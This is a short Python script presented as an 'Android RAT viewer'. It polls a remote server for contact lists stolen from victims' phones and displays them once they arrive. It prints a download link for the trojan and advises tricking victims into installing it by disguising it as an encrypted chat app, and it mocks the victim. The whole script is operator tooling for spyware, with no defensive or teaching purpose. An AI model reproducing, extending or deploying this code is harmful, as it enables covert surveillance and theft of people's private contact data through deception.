import time
import requests
import os
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"
version = "v0.1"
ar_link = f"{GREEN}https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.){RESET}"
contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
print(f"{BLUE}Coded by Nihility{RESET}")
print(f"{RED}Android RAT viewer.{RESET}")
print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
time.sleep(1)
while True:
    try:
        response = requests.get(contacts_url)
        if response.status_code == 200:
            content = response.text.strip()
            if content:
                os.system('clear')
                print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                print(f"{GREEN}Content:\n {content} {RESET}")
                input("Press Enter to exit.")
                break
            else:
                os.system('clear')
                print(f"""
                      {RED}

                            ███___ ___    _____  _________  ____  __.  _________      
                            ███░/   |   \  /  _  \ \_   ___ \|    |/ _| /   _____/      
                          ███░ /    ~    \/  /_\  \/    \  \/|      <   \_____  \       
                         ██░   \    Y    /    |    \     \___|    |  \  /        \      
                         ░      \___|_  /\____|__  /\______  /____|__ \/_______  /    
                                   ██\/         \/    ░   \/        \/░       \/{RESET}

                                         CODE: Nihility
                                         I might need a coffee break, it's 3:18 AM
                                         NAME: Android Rat (Texter 2026)

                      """)
                print(f"{BLUE}The Trojans url:  {RESET}" + ar_link + f"\n {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
                print(f"{RED}Dumbass has yet to open the trojan, waiting...{RESET}")
                
        else:
            print(f"Received status code {response.status_code}")
    except Exception as e:
        print(f"Error fetching data, Content might be too large to gather. Download it.: {e}") # Remember to implent a download function
        os.system('clear')

    time.sleep(2)
